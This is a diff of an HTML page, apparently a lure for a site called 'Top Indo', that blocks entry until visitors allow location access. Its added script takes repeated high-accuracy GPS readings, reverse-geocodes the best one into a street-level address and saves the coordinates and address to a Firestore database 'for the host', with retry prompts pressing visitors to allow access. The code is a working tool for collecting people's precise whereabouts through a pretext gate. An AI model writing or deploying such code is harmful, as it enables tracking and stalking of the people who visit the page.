@@ -1,58 +1,198 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Allow Location</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Allow Location — Top Indo</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
-  body {
-    font-family: Poppins, sans-serif;
-    background: #0f172a;
-    color: white;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    text-align: center;
-    padding:20px;
-  }
-  button {
-    padding: 14px 20px;
-    font-size: 18px;
-    border: none;
-    background: #38bdf8;
-    color: black;
-    border-radius: 10px;
-    cursor: pointer;
-  }
+  :root{ --bg:#0f172a; --glass: rgba(255,255,255,0.04); --accent:#ff7ab6; }
+  html,body{height:100%; margin:0; font-family:'Poppins',sans-serif; background:var(--bg); color:#fff;}
+  .wrap{height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; box-sizing:border-box;}
+  .card{width:94%; max-width:420px; background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01)); border-radius:16px; padding:22px; text-align:center; box-shadow:0 12px 40px rgba(0,0,0,0.6); border:1px solid rgba(255,255,255,0.04);}
+  h1{margin:0 0 8px 0; font-weight:600; font-size:20px; color:var(--accent)}
+  p{margin:6px 0 14px 0; color:rgba(255,255,255,0.9); font-size:14px}
+  #enterBtn{width:100%; padding:14px; font-size:16px; font-weight:700; border-radius:12px; border:0; cursor:pointer; background:linear-gradient(90deg,var(--accent),#ff5f9e); color:#fff}
+  #enterBtn[disabled]{opacity:0.5; cursor:not-allowed}
+  #status{margin-top:12px; font-size:13px; color:rgba(255,255,255,0.9); min-height:20px}
+  .small{font-size:12px; opacity:0.8; margin-top:10px}
+  .retry{margin-top:14px; display:flex; gap:8px; justify-content:center}
+  .btn-ghost{background:transparent;border:1px solid rgba(255,255,255,0.08); padding:8px 12px; border-radius:10px; color:#fff; cursor:pointer}
 </style>
 </head>
-
 <body>
 
-<div>
-  <h2>📍 Please Tap to Allow Location</h2>
-  <p>This is required before visiting the website.</p>
-  <button id="tapBtn">Tap to Continue</button>
+<div class="wrap">
+  <div class="card" role="main" aria-labelledby="title">
+    <h1 id="title">One quick step — allow location</h1>
+    <p>Tap <b>ENTER</b> and allow location when the prompt appears. We will save your location (for the host) and then open the site.</p>
+
+    <button id="enterBtn">ENTER</button>
+
+    <div id="status"></div>
+    <div class="small">If you deny, you'll need to tap again and allow permissions.</div>
+
+    <div class="retry" style="display:none">
+      <button id="retryBtn" class="btn-ghost">Try again</button>
+      <button id="openHelp" class="btn-ghost">How to enable location</button>
+    </div>
+  </div>
 </div>
 
-<!-- Load Firebase config -->
-<script type="module" src="./firebase-config.js"></script>
+<!-- Module script that requests location, reverse geocodes and saves to Firestore -->
+<script type="module">
+  import { db } from "./firebase-config.js";
+  import { collection, addDoc } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
 
-<!-- Load location logic (DO NOT import any function!) -->
-<script type="module" src="./location.js"></script>
+  const enterBtn = document.getElementById('enterBtn');
+  const statusEl = document.getElementById('status');
+  const retryWrap = document.querySelector('.retry');
+  const retryBtn = document.getElementById('retryBtn');
+  const openHelp = document.getElementById('openHelp');
 
-<script>
-  document.getElementById("tapBtn").addEventListener("click", () => {
-    console.log("Tap detected — triggering location.js");
+  // getBestPosition: watch several samples and pick the best (smallest accuracy)
+  function getBestPosition({maxWait=20000, minAcceptableAccuracy=50, maxSamples=6} = {}) {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
 
-    // Give time for saving location
-    setTimeout(() => {
-      window.location.href = "index.html";
-    }, 1500);
+      let best = null;
+      let samples = 0;
+      let done = false;
+
+      const watchId = navigator.geolocation.watchPosition(
+        pos => {
+          samples++;
+          if (!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
+          // if good enough, finish early
+          if (pos.coords.accuracy <= minAcceptableAccuracy) {
+            done = true;
+            navigator.geolocation.clearWatch(watchId);
+            resolve(best);
+          }
+          if (samples >= maxSamples && !done) {
+            done = true;
+            navigator.geolocation.clearWatch(watchId);
+            resolve(best);
+          }
+        },
+        err => {
+          if (!done) {
+            done = true;
+            navigator.geolocation.clearWatch(watchId);
+            reject(err);
+          }
+        },
+        { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 }
+      );
+
+      // global timeout fallback
+      setTimeout(() => {
+        if (!done) {
+          done = true;
+          navigator.geolocation.clearWatch(watchId);
+          if (best) return resolve(best);
+          return reject(new Error('Timed out obtaining location'));
+        }
+      }, maxWait);
+    });
+  }
+
+  // Reverse geocode via BigDataCloud (no key, CORS-friendly)
+  async function reverseGeocode(lat, lon) {
+    try {
+      const url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${encodeURIComponent(lat)}&longitude=${encodeURIComponent(lon)}&localityLanguage=en`;
+      const res = await fetch(url);
+      if (!res.ok) throw new Error('Reverse geocode failed');
+      return await res.json();
+    } catch (err) {
+      console.warn('reverse error', err);
+      return {};
+    }
+  }
+
+  async function saveToFirestore(record) {
+    try {
+      await addDoc(collection(db, 'locations'), record);
+      return true;
+    } catch (err) {
+      console.error('Firestore save failed', err);
+      throw err;
+    }
+  }
+
+  function showStatus(txt, color='') {
+    statusEl.textContent = txt;
+    statusEl.style.color = color || '';
+  }
+
+  async function handleEnter() {
+    enterBtn.disabled = true;
+    retryWrap.style.display = 'none';
+    showStatus('Requesting location permission…');
+
+    try {
+      // 1. Get best position (watchPosition)
+      const pos = await getBestPosition({ maxWait: 20000, minAcceptableAccuracy: 40, maxSamples: 6 });
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const accuracy = pos.coords.accuracy;
+
+      showStatus(`Got location — accuracy ${Math.round(accuracy)} m. Reverse geocoding…`);
+
+      // 2. Reverse geocode
+      const geo = await reverseGeocode(lat, lon);
+
+      // Build record
+      const record = {
+        lat,
+        lon,
+        accuracy,
+        timestamp: new Date().toISOString(),
+        formatted_address: geo.timezone ? (geo.locality || geo.city || '') + ', ' + (geo.principalSubdivision || '') + ', ' + (geo.countryName || '') : (geo.locality || geo.city || geo.countryName || geo.principalSubdivision || '') || geo.locality || geo.city || geo.countryName || '',
+        city: geo.city || geo.locality || geo.principalSubdivision || '',
+        state: geo.principalSubdivision || '',
+        country: geo.countryName || '',
+        postal_code: geo.postcode || '',
+        raw: geo
+      };
+
+      showStatus('Saving location to database…');
+
+      await saveToFirestore(record);
+
+      showStatus('Saved ✅ Redirecting…');
+
+      // short delay so user perceives success
+      setTimeout(()=> window.location.href = 'index.html', 700);
+
+    } catch (err) {
+      console.error('Location flow failed', err);
+      // Permission denied or other errors
+      showStatus('Could not get location — please allow location and try again.', 'salmon');
+      retryWrap.style.display = 'flex';
+      enterBtn.disabled = false;
+    }
+  }
+
+  // initial button listener
+  enterBtn.addEventListener('click', (e) => {
+    // Important: we call handleEnter directly inside the user gesture so permission prompt is shown immediately
+    handleEnter();
   });
-</script>
 
+  // retry
+  retryBtn.addEventListener('click', () => {
+    retryWrap.style.display = 'none';
+    showStatus('');
+    handleEnter();
+  });
+
+  openHelp.addEventListener('click', () => {
+    alert('On Android: tap the lock icon in the address bar → Site settings → Location → Allow.\n\nOn iPhone (Safari): Settings → Safari → Location → While Using the App / Ask.\n\nAlternatively, open this link in the real browser (Chrome / Safari).');
+  });
+
+</script>
 </body>
 </html>
